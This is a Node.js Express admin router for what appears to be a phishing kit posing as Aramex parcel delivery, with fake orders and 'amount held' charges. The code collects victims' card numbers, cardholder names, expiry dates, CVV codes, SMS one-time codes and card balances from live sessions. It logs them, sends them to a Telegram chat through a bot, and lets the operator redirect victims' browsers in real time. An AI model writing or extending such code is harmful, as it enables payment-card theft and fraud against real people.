const { Telegraf } = require("telegraf");
const { message } = require("telegraf/filters");
var express = require("express");
var router = express.Router();
const Admin = require("../model/Admin");
const Log = require("../model/Log");
const Order = require("../model/Order");
const mongoose = require("mongoose");
const bcrypt = require("bcrypt");
const io = require("../io");

const isLoggedIn = require("../middleware/isLoggedIn");
const config = require("../config");

const bot = new Telegraf(require("../config").BOT_TOKEN);

const db = mongoose.connection;

db.once("open", () => {
  const sessionCollection = db.collection("sessions");
  const sessionChangeStream = sessionCollection.watch();

  sessionChangeStream.on("change", async (change) => {
    const sessions = await mongoose.connection
      .collection("sessions")
      .find({ "session.uniqueID": { $exists: true, $ne: null } })
      .toArray();
    io.getIO().emit("session-update", sessions);
  });
});

// Register route
router.get("/register", async (req, res) => {
  // Check if any admin user already exists in the database
  const adminExists = await Admin.countDocuments();

  if (adminExists > 0) {
    // If an admin exists, deny registration
    return res.redirect("/admin/login");
  }

  res.render("admin/register");
});

router.post("/register", async (req, res, next) => {
  Admin.countDocuments().then((adminQty) => {
    if (adminQty !== 0) {
      return res.redirect("/admin/login");
    }

    const username = req.body.username;
    const password = req.body.password;

    bcrypt
      .hash(password, 12)
      .then((hashedPassword) => {
        const admin = new Admin({
          username: username,
          password: hashedPassword,
        });

        return admin.save();
      })
      .then((result) => {
        res.redirect("/admin/login");
      })
      .catch((err) => {
        const error = new Error(err);
        error.httpStatusCode = 500;
        return next(error);
      });
  });
});

// Login route
router.get("/login", async (req, res) => {
  // Check if any admin user already exists in the database
  const adminExists = await Admin.countDocuments();

  if (adminExists > 0) {
    // If an admin exists, deny registration
    return res.render("admin/login");
  }

  res.redirect("/admin/register");
});

router.post("/login", (req, res, next) => {
  const username = req.body.username;
  const password = req.body.password;

  Admin.findOne({ username: username }).then((admin) => {
    if (!admin) {
      res.redirect("/admin/login");
    }
    bcrypt
      .compare(password, admin.password)
      .then((doMatch) => {
        if (doMatch) {
          req.session.isLoggedIn = true;
          req.session.admin = admin;
          return req.session.save((err) => {
            console.log(err);
            res.redirect("/admin");
          });
        }
        return res.redirect("/admin/login");
      })
      .catch((err) => {
        const error = new Error(err);
        error.httpStatusCode = 500;
        return next(error);
      });
  });
});

router.get("/", isLoggedIn, async (req, res, next) => {
  const sessions = await mongoose.connection
    .collection("sessions")
    .find({ "session.uniqueID": { $exists: true, $ne: null } })
    .toArray();

  res.render("admin/index", {
    sessions: sessions,
  });
});

router.get("/session/:uniqueID", async (req, res, next) => {
  try {
    const session = await mongoose.connection
      .collection("sessions")
      .findOne({ "session.uniqueID": req.params.uniqueID });

    if (!session) {
      return res.redirect("back");
    }

    res.render("admin/session", {
      session: session,
      uniqueID: req.params.uniqueID,
      orderId: req.session.orderId,
    });
  } catch (error) {
    console.log(err.message);
  }
});

router.get("/api/session-data", async (req, res, next) => {
  try {
    const data = await mongoose.connection
      .collection("sessions")
      .find({ "session.uniqueID": { $exists: true, $ne: null } })
      .toArray();
    res.json(data);
  } catch (error) {
    res.status("500").json({ error: "Internal Server Error" });
  }
});

router.post("/api/getUrl", async (req, res, next) => {
  try {
    io.getIO().emit("redirect", { url: req.body.url, vcid: req.body.vcId });
    res.status(200).send("ok");
  } catch (error) {
    res.status("500").json({ error: "Internal Server Error" });
  }
});

router.post("/api/saveSession", async (req, res, next) => {
  const data = await mongoose.connection
    .collection("sessions")
    .findOne({ "session.uniqueID": req.body.vcId });

  new Log({
    uniqueID: data.session.uniqueID,
    ipAddress: data.session.ip,
    country: data.session.country,
    cardNumber: data.session.cardNumber,
    cardHolder: data.session.cardHolder,
    expiryDate: data.session.expiryDate,
    cvvNumber: data.session.cvvNumber,
    smsCode: data.session.smsCode,
    cardBalance: data.session.cardBalance,
  })
    .save()
    .then((result) => {
      res.send("ok").status(200);
    });
});

router.post("/api/exportTelegram", async (req, res, next) => {
  const data = await mongoose.connection
    .collection("sessions")
    .findOne({ "session.uniqueID": req.body.vcId });

  bot.telegram.sendMessage(
    require("../config").CHAT_ID,
    `------ NEW ARAMEX LOG -----\n\nUnique ID: ${data.session.uniqueID}\nIP Address: ${data.session.ip}\nCountry: ${data.session.country}\nCard Number: ${data.session.cardNumber}\nCard Holder: ${data.session.cardHolder}\nExpiry Date: ${data.session.expiryDate}\nCVV Number: ${data.session.cvvNumber}\nSMS Code: ${data.session.smsCode}\nCard Balance: ${data.session.cardBalance}`
  );
});

router.get("/logs", async (req, res, next) => {
  const logs = await Log.find();

  res.render("admin/logs", {
    logs: logs,
  });
});

router.get("/export-log/:id", async (req, res, next) => {
  const data = await Log.findById(req.params.id);

  bot.telegram.sendMessage(config.CHAT_ID, `<code>${data}</code>`, {
    parse_mode: "HTML",
  });
  res.redirect("back");
});

router.get("/delete-log/:id", async (req, res, next) => {
  await Log.findByIdAndDelete(req.params.id).then((deleted) => {
    return res.redirect("back");
  });
});

router.get("/orders", async (req, res, next) => {
  const orders = await Order.find();

  res.render("admin/orders", { orders: orders });
});

router.get("/create-order", async (req, res, next) => {
  res.render("admin/add-order");
});

router.post("/create-order", async (req, res, next) => {
  new Order({
    person_name: req.body.person_name,
    product_name: req.body.product_name,
    track_number: req.body.track_number,
    delivery_address: req.body.delivery_address,
    phone_number: req.body.phone_number,
    amount_held: req.body.amount_held,
  })
    .save()
    .then((result) => {
      res.redirect("/admin/orders");
    });
});

router.get("/edit-order/:id", async (req, res, next) => {
  const data = await Order.findById(req.params.id);

  res.render("admin/edit-order", { data: data });
});

router.post("/edit-order", async (req, res, next) => {
  const data = await Order.findById(req.body.orderId);

  data.person_name = req.body.person_name;
  data.product_name = req.body.product_name;
  data.track_number = req.body.track_number;
  data.delivery_address = req.body.delivery_address;
  data.phone_number = req.body.phone_number;
  data.amount_held = req.body.amount_held;
  data.save().then((result) => {
    res.redirect("/admin/orders");
  });
});

module.exports = router;
